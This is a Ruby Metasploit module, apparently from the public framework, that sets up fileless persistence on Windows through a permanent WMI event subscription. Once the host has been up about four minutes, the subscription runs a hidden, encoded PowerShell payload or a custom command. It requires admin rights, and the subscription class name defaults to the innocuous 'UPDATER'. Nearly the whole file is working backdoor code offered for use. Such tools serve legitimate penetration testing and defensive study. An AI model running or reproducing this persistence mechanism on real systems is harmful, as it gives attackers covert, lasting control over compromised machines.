##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::Windows::Powershell
  include Msf::Exploit::Powershell
  include Post::Windows::Priv
  include Msf::Post::File
  include Msf::Exploit::Local::Persistence
  include Msf::Exploit::Deprecated
  moved_from 'exploits/windows/local/wmi_persistence'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WMI Event Subscription Logon Timer Persistence',
        'Description' => %q{
          This module will create a permanent WMI event subscription to achieve file-less persistence using event filter that
          will trigger the payload after the system has an uptime of 4 minutes.

          Additionally a custom command can be specified to run once the trigger is
          activated using the advanced option CUSTOM_PS_COMMAND. This module requires administrator level privileges as well as a
          high integrity process. It is also recommended to use staged payloads due to powershell script length limitations.
        },
        'Author' => ['Nick Tyrer <@NickTyrer>'],
        'License' => MSF_LICENSE,
        'Privileged' => true,
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'Targets' => [['Windows', {}]],
        'DisclosureDate' => '2017-06-06',
        'DefaultTarget' => 0,
        'References' => [
          ['URL', 'https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf'],
          ['URL', 'https://learn-powershell.net/2013/08/14/powershell-and-events-permanent-wmi-event-subscriptions/'],
          ['ATT&CK', Mitre::Attack::Technique::T1546_003_WINDOWS_MANAGEMENT_INSTRUMENTATION_EVENT_SUBSCRIPTION]
        ],
        'Notes' => {
          'Reliability' => [EVENT_DEPENDENT, REPEATABLE_SESSION],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptEnum.new('PERSISTENCE_METHOD',
                  [true, 'Method to trigger the payload.', 'EVENT', ['EVENT', 'INTERVAL', 'LOGON', 'PROCESS', 'WAITFOR']]),
      OptInt.new('EVENT_ID_TRIGGER',
                 [true, 'Event ID to trigger the payload. (Default: 4625)', 4625]),
      OptString.new('USERNAME_TRIGGER',
                    [true, 'The username to trigger the payload. (Default: BOB)', 'BOB' ]),
      OptString.new('PROCESS_TRIGGER',
                    [true, 'The process name to trigger the payload. (Default: CALC.EXE)', 'CALC.EXE' ]),
      OptString.new('WAITFOR_TRIGGER',
                    [true, 'The word to trigger the payload. (Default: CALL)', 'CALL' ]),
      OptInt.new('CALLBACK_INTERVAL',
                 [true, 'Time between callbacks (In milliseconds). (Default: 1800000).', 1_800_000 ]), # 30 minutes
      OptString.new('CLASSNAME',
                    [true, 'WMI event class name. (Default: UPDATER)', 'UPDATER' ])
    ])

    register_advanced_options(
      [
        OptString.new('CUSTOM_PS_COMMAND',
                      [false, 'Custom powershell command to run once the trigger is activated. (Note: some commands will need to be enclosed in quotes)', false, ]),
      ]
    )
  end

  def check
    print_warning('Payloads in %TEMP% will only last until reboot, you want to choose elsewhere.') if datastore['WritableDir'].start_with?('%TEMP%') # check the original value
    return CheckCode::Safe('This module requires powershell to run') unless have_powershell?

    return CheckCode::Safe('This module requires admin privs to run') unless is_admin?

    return CheckCode::Safe('This module cannot run as System') if is_system?

    return CheckCode::Safe('This module requires UAC to be bypassed first') unless is_high_integrity?

    CheckCode::Appears('Likely exploitable')
  end

  def exploit
    print_status('Installing Persistence...')

    psh_exec(subscription_logon)
    print_good 'Persistence installed!'
    name_class = datastore['CLASSNAME']
    @clean_up_rc << "execute -H -f wmic -a \"/NAMESPACE:\\\"\\\\\\\\root\\\\subscription\\\" PATH __EventFilter WHERE Name=\\\"#{name_class}\\\" DELETE\"\n"
    @clean_up_rc << "execute -H -f wmic -a \"/NAMESPACE:\\\"\\\\\\\\root\\\\subscription\\\" PATH CommandLineEventConsumer WHERE Name=\\\"#{name_class}\\\" DELETE\"\n"
    @clean_up_rc << "execute -H -f wmic -a \"/NAMESPACE:\\\"\\\\\\\\root\\\\subscription\\\" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=\\\"#{name_class}\\\"' DELETE\""
  end

  def build_payload
    if datastore['CUSTOM_PS_COMMAND']
      script_in = datastore['CUSTOM_PS_COMMAND']
      compressed_script = compress_script(script_in, eof = nil)
      encoded_script = encode_script(compressed_script, eof = nil)
      generate_psh_command_line(noprofile: true, windowstyle: 'hidden', encodedcommand: encoded_script)
    else
      cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
    end
  end

  def subscription_logon
    command = build_payload
    class_name = datastore['CLASSNAME']
    <<-HEREDOC
    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = \"#{class_name}\"; Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"; QueryLanguage = 'WQL'}
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = \"#{class_name}\"; CommandLineTemplate = \"#{command}\"}
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
    HEREDOC
  end
end
